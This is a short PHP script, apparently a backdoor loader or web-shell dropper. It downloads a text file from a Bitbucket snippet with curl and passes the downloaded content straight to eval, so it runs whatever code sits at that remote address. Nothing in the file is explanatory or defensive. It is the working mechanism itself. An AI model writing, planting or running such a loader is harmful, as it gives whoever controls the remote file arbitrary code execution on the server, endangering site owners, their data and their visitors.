<?php
    $Url = "https://bitbucket.org/!api/2.0/snippets/manimandz/pqyGB6/ba0d706b1f704aabe3f1943c6708972d8a539e5b/files/waa.txt";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);

?>